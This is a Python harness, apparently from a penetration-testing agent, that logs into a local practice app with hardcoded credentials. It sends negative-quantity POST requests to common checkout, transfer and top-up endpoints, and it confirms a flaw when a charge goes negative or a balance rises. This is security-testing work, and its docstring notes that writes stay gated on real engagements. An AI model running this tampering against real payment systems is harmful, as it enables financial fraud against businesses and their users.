#!/usr/bin/env python3
"""bizlogic_harness.py - transaction / business-logic tampering (black-box).

STATE-CHANGING. Gated by ALLOW_WRITE: True here only because the range is throwaway; real
engagements keep it OFF or human-gated (sending negative-quantity purchases mutates balances).

Finds transactional POST endpoints and tests value tampering: a negative quantity across
common field names, in JSON and form bodies. CONFIRMS when the app ACCEPTS a tamper that
moves value in the attacker's favour - a charge/amount/total that goes negative (the system
agrees to PAY the attacker to transact), or a balance/credit that rises versus a legit
baseline request. That favourable-delta is the oracle; a well-built endpoint rejects qty<=0.
"""
from __future__ import annotations
import sys, json, time, http.cookiejar, urllib.request, urllib.parse, urllib.error, pathlib
from urllib.parse import urlencode

BASE = "http://127.0.0.1:8099"
CREDS = {"alice": "Sunflower#A1pha"}
OUT = r"C:\Users\Laith\nabulus-agent\bizlogic_findings.json"
PACE = 0.02
ALLOW_WRITE = True

TXN_PATHS = ["/api/checkout", "/api/purchase", "/api/buy", "/api/order", "/api/orders",
             "/api/transfer", "/api/topup", "/api/withdraw", "/api/redeem", "/api/pay",
             "/api/cart/checkout", "/checkout"]
QTY_FIELDS = ["qty", "quantity", "amount", "count", "num", "n", "units", "seats"]
NEG = -5
CHARGE_KEYS = ["charged", "amount", "total", "cost", "debit", "price"]   # <0 = favourable
BAL_KEYS = ["credit", "balance", "wallet", "funds"]                       # increase = favourable


def login(user, pw):
    cj = http.cookiejar.CookieJar()
    op = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(cj))
    try:
        op.open(BASE + "/login", data=urlencode({"username": user, "password": pw}).encode(), timeout=10)
    except Exception:
        pass
    return "; ".join(f"{c.name}={c.value}" for c in cj)


def post(url, cookie, field, val, ctype):
    if PACE:
        time.sleep(PACE)
    body = {"item": "seat", field: val}
    if ctype == "json":
        data = json.dumps(body).encode(); ch = "application/json"
    else:
        data = urlencode(body).encode(); ch = "application/x-www-form-urlencoded"
    r = urllib.request.Request(url, data=data, method="POST",
                              headers={"Cookie": cookie, "Content-Type": ch})
    try:
        with urllib.request.urlopen(r, timeout=10) as resp:
            raw = resp.read(60000).decode("utf-8", "replace")
    except urllib.error.HTTPError as e:
        raw = (e.read(60000).decode("utf-8", "replace") if e.fp else ""); return e.code, {}, raw
    except Exception:
        return 0, {}, ""
    try:
        return 200, json.loads(raw), raw
    except Exception:
        return 200, {}, raw


def favourable(base_js, tamper_js):
    """Return a reason string if the tamper moved value toward the attacker, else ''."""
    for k in CHARGE_KEYS:
        v = tamper_js.get(k)
        if isinstance(v, (int, float)) and v < 0:
            return f"negative {k}={v} accepted (system pays attacker)"
    for k in BAL_KEYS:
        tv, bv = tamper_js.get(k), base_js.get(k)
        if isinstance(tv, (int, float)) and isinstance(bv, (int, float)) and tv > bv:
            return f"{k} rose {bv}->{tv} after a 'purchase'"
    return ""


def main():
    if not ALLOW_WRITE:
        print("[bizlogic] ALLOW_WRITE is off; skipping state-changing probes."); return 0
    cookie = login("alice", CREDS["alice"])
    findings = []
    print(f"login: {'yes' if cookie else 'NO'} | txn endpoints to probe: {len(TXN_PATHS)}")
    for pth in TXN_PATHS:
        url = BASE + pth
        done = False
        for ctype in ("json", "form"):
            if done:
                break
            for field in QTY_FIELDS:
                st_base, base_js, _ = post(url, cookie, field, 1, ctype)
                if st_base not in (200, 201):
                    break                                   # endpoint/field not live for this ctype
                st_t, tamper_js, raw = post(url, cookie, field, NEG, ctype)
                if st_t not in (200, 201):
                    continue
                reason = favourable(base_js, tamper_js)
                if reason:
                    findings.append({"class": "business-logic", "subtype": "quantity-tamper",
                                     "severity": "high", "endpoint": url, "param": field,
                                     "ctype": ctype, "detail": f"{field}={NEG}: {reason}",
                                     "proof_request": f"POST {pth} ({ctype}) {field}={NEG}",
                                     "validated_by": "negative-quantity tamper accepted with favourable value delta",
                                     "confirmed": True})
                    print(f"[bizlogic] CONFIRMED business-logic: {pth} field={field} ({ctype}) -> {reason}")
                    done = True
                    break
    pathlib.Path(OUT).write_text(json.dumps(findings, indent=2), encoding="utf-8")
    print(f"[bizlogic] confirmed findings: {len(findings)} -> {OUT}")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
